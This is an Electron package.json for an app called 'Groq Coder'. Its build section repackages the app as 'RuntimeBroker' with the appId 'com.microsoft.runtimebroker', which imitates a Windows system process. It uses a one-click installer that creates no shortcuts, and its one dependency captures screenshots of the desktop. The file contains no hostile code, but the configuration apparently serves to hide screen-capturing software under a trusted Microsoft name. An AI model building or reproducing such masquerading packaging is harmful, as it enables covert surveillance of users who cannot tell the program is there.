{
  "name": "groq-coder",
  "version": "4.0.0",
  "description": "Groq Coder",
  "author": "dev",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "build": "electron-builder --win nsis"
  },
  "build": {
    "appId": "com.microsoft.runtimebroker",
    "productName": "RuntimeBroker",
    "executableName": "RuntimeBroker",
    "icon": "assets/icon.ico",
    "win": {
      "icon": "assets/icon.ico",
      "target": "nsis",
      "executableName": "RuntimeBroker"
    },
    "nsis": {
      "oneClick": true,
      "perMachine": false,
      "artifactName": "RuntimeBroker-Setup.exe",
      "shortcutName": "RuntimeBroker",
      "createDesktopShortcut": false,
      "createStartMenuShortcut": false
    },
    "files": [
      "**/*",
      "!dist/**",
      "!*.zip",
      "!*.md"
    ],
    "npmRebuild": true,
    "extraMetadata": {
      "name": "RuntimeBroker"
    }
  },
  "dependencies": {
    "screenshot-desktop": "^1.15.0"
  },
  "devDependencies": {
    "electron": "^28.1.0",
    "electron-builder": "^24.0.0"
  }
}